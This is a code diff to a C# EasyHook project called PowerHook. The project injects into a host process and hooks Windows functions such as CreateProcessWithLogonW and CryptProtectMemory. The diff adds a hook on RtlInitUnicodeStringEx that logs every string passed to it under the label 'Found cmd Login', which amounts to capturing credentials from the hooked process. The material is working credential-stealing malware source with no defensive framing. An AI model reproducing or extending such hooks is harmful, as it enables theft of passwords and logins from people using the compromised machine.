@@ -12,6 +12,14 @@ namespace PowerHook
     {
 
 
+        public struct UNICODE_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            [MarshalAs(UnmanagedType.LPWStr)]
+            public string Buffer;
+        }
+
 
 
         [Flags]
@@ -126,12 +134,23 @@ namespace PowerHook
                 new CharUpperBuffA_Delegate(CharUpperBuffA_Hook),
                 this);
 
+                LoadLibrary("ntdll.dll");
+                var CreateRtlInitUnicodeStringEx = EasyHook.LocalHook.Create(
+                EasyHook.LocalHook.GetProcAddress("ntdll.dll", "RtlInitUnicodeStringEx"),
+                new RtlInitUnicodeStringEx_Delegate(RtlInitUnicodeStringEx_Hook),
+                this);
+
+
+
 
 
             // Activate hooks on all threads except the current thread
             CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
             createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
             CreateCharUpperBuffA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            //CreateRtlInitUnicodeStringEx.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+           
+
 
             _server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());
 
@@ -173,10 +192,49 @@ namespace PowerHook
             CreateProcessWithLogonW.Dispose();
             createCryptHook.Dispose();
             CreateCharUpperBuffA.Dispose();
+            CreateRtlInitUnicodeStringEx.Dispose();
+         
+
+
 
             // Finalise cleanup of hooks
             EasyHook.LocalHook.Release();
         }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
+
+        [DllImport("ntdll.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
+
+        bool RtlInitUnicodeStringEx_Hook(
+            ref UNICODE_STRING DestinationString,
+            [MarshalAs(UnmanagedType.LPWStr)] String SourceString)
+        {
+            try
+            {
+                lock (this._messageQueue)
+                {
+                    if (this._messageQueue.Count < 1000)
+                    {
+
+
+                        String Data = SourceString;
+
+                        this._messageQueue.Enqueue(
+                        string.Format("[+] Found cmd Login --> {0}", Data));
+
+
+                    }
+                }
+            }
+            catch
+            {
+                // swallow exceptions so that any issues caused by this code do not crash target process
+            }
+            return RtlInitUnicodeStringEx(ref DestinationString, SourceString);
+        }
+
 
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
@@ -226,9 +284,9 @@ namespace PowerHook
         }
 
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
         delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
-        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
         static extern bool CryptProtectMemory(
             IntPtr pData,
             uint cbData,
